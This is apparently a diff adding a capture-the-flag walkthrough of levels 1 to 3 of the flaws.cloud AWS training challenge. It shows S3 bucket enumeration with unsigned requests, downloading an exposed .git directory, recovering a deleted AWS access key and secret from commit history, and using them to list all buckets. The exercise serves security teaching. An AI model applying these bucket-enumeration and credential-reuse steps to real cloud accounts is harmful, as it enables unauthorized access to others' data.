@@ -134,11 +134,219 @@ Search Public Buckets
 
 ### Flaws
 
+[http://flaws.cloud/](http://flaws.cloud/)
+
 #### Level 1
+
+> This level is _buckets_ of fun. See if you can find the first sub-domain.
+
+Use `nslookup` on the given/known hostname:
+
+```bash
+C:\>nslookup flaws.cloud
+Server:  localhost
+Address:  127.0.0.1
+
+Non-authoritative answer:
+Name:    flaws.cloud
+Addresses:  52.218.201.35
+          52.218.201.59
+          52.218.237.58
+          52.218.242.210
+          52.218.244.19
+          52.218.244.139
+          52.92.132.251
+          52.92.195.179
+```
+
+Use `nslookup` on the found Addresses:
+
+```bash
+C:\>nslookup 52.218.201.35
+Server:  localhost
+Address:  127.0.0.1
+
+Name:    s3-website-us-west-2.amazonaws.com
+Address:  52.218.201.35
+```
+
+Use `aws` CLI on the domain:
+
+```bash
+C:\>aws s3 ls s3://flaws.cloud --no-sign-request
+2017-03-13 23:00:38       2575 hint1.html
+2017-03-02 23:05:17       1707 hint2.html
+2017-03-02 23:05:11       1101 hint3.html
+2020-05-22 14:16:45       3162 index.html
+2018-07-10 12:47:16      15979 logo.png
+2017-02-26 20:59:28         46 robots.txt
+2017-02-26 20:59:30       1051 secret-dd02c7c.html
+```
+
+Found an interesting file, secret-dd02c7c.html, which did in fact get us to Level 2.
 
 #### Level 2
 
+> The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the [free tier](https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free\_np/).
+
+Use `nslookup` on the given/known hostname:
+
+```bash
+C:\>nslookup level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+Server:  localhost
+Address:  127.0.0.1
+
+Non-authoritative answer:
+Name:    level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+Addresses:  52.218.177.202
+          52.218.219.90
+          52.218.220.42
+          52.218.233.194
+          52.218.253.10
+          52.92.180.179
+          52.218.153.194
+          52.218.170.67
+```
+
+Use `nslookup` on the found Addresses:
+
+```bash
+C:\Users\esanderford>nslookup 52.218.177.202
+Server:  localhost
+Address:  127.0.0.1
+
+Name:    s3-website-us-west-2.amazonaws.com
+Address:  52.218.177.202
+```
+
+Use `aws` CLI on the domain:
+
+```bash
+C:\>aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+2017-02-26 21:02:15      80751 everyone.png
+2017-03-02 22:47:17       1433 hint1.html
+2017-02-26 21:04:39       1035 hint2.html
+2017-02-26 21:02:14       2786 index.html
+2017-02-26 21:02:14         26 robots.txt
+2017-02-26 21:02:15       1051 secret-e4443fc.html
+```
+
+Found an interesting file, secret-e4443fc.html, which did in fact get us to Level 3.
+
 #### Level 3
+
+> The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.
+
+Use `aws` CLI on the domain:
+
+```bash
+C:\>aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+                           PRE .git/
+2017-02-26 19:14:33     123637 authenticated_users.png
+2017-02-26 19:14:34       1552 hint1.html
+2017-02-26 19:14:34       1426 hint2.html
+2017-02-26 19:14:35       1247 hint3.html
+2017-02-26 19:14:33       1035 hint4.html
+2020-05-22 14:21:10       1861 index.html
+2017-02-26 19:14:33         26 robots.txt
+```
+
+Used `--recursive` as there was a PRE (Prefix) found for the file/path .git.
+
+```bash
+C:\>aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --recursive
+2017-09-17 11:12:24         52 .git/COMMIT_EDITMSG
+2017-09-17 11:12:24         23 .git/HEAD
+2017-09-17 11:12:24        130 .git/config
+2017-09-17 11:12:24         73 .git/description
+2017-09-17 11:12:24        452 .git/hooks/applypatch-msg.sample
+2017-09-17 11:12:24        896 .git/hooks/commit-msg.sample
+2017-09-17 11:12:24        189 .git/hooks/post-update.sample
+2017-09-17 11:12:24        398 .git/hooks/pre-applypatch.sample
+2017-09-17 11:12:24       1704 .git/hooks/pre-commit.sample
+2017-09-17 11:12:24       4898 .git/hooks/pre-rebase.sample
+2017-09-17 11:12:24       1239 .git/hooks/prepare-commit-msg.sample
+2017-09-17 11:12:24       3611 .git/hooks/update.sample
+2017-09-17 11:12:24        600 .git/index
+2017-09-17 11:12:24        240 .git/info/exclude
+2017-09-17 11:12:24        359 .git/logs/HEAD
+2017-09-17 11:12:24        359 .git/logs/refs/heads/master
+2017-09-17 11:12:24        679 .git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
+2017-09-17 11:12:24        770 .git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df
+2017-09-17 11:12:25        820 .git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c
+2017-09-17 11:12:25        245 .git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b
+2017-09-17 11:12:25     112013 .git/objects/76/e4934c9de40e36f09b4e5538236551529f723c
+2017-09-17 11:12:25        560 .git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c
+2017-09-17 11:12:25        191 .git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
+2017-09-17 11:12:25         42 .git/objects/c2/aab7e03933a858d1765090928dca4013fe2526
+2017-09-17 11:12:25        904 .git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2
+2017-09-17 11:12:25         98 .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
+2017-09-17 11:12:25        279 .git/objects/f2/a144957997f15729d4491f251c3615d508b16a
+2017-09-17 11:12:25        125 .git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
+2017-09-17 11:12:25         41 .git/refs/heads/master
+2017-02-26 19:14:33     123637 authenticated_users.png
+2017-02-26 19:14:34       1552 hint1.html
+2017-02-26 19:14:34       1426 hint2.html
+2017-02-26 19:14:35       1247 hint3.html
+2017-02-26 19:14:33       1035 hint4.html
+2020-05-22 14:21:10       1861 index.html
+2017-02-26 19:14:33         26 robots.txt
+```
+
+Downloaded the .git repository locally:
+
+```bash
+C:\>aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud .
+...
+```
+
+Used `git` to enumerate the logs, commits, and branches:
+
+```bash
+C:\flaws-level3>git show
+commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
+Author: 0xdabbad00 <scott@summitroute.com>
+Date:   Sun Sep 17 09:10:43 2017 -0600
+
+    Oops, accidentally added something I shouldn't have
+
+diff --git a/access_keys.txt b/access_keys.txt
+deleted file mode 100644
+index e3ae6dd..0000000
+--- a/access_keys.txt
++++ /dev/null
+@@ -1,2 +0,0 @@
+-access_key AKIAJ366LIPB4IJKT7SA
+-secret_access_key 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
+```
+
+Now to create an AWS profile locally with the found Access Key and Secret Access Key.
+
+```bash
+C:\flaws-level3>aws configure --profile flaws-l3
+AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
+AWS Secret Access Key [None]: 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
+Default region name [None]:
+Default output format [None]:
+```
+
+Can view all the buckets this profile has access to:
+
+```bash
+C:\Users\esanderford\flaws-level3>aws --profile flaws-l3 s3 ls
+2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
+2017-05-29 12:34:53 config-bucket-975426262029
+2017-02-12 15:03:24 flaws-logs
+2017-02-04 22:40:07 flaws.cloud
+2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
+2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
+2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
+```
+
+The Level 4 bucket URL was leaked which can be navigated to get us to Level 4.
 
 #### Level 4
 
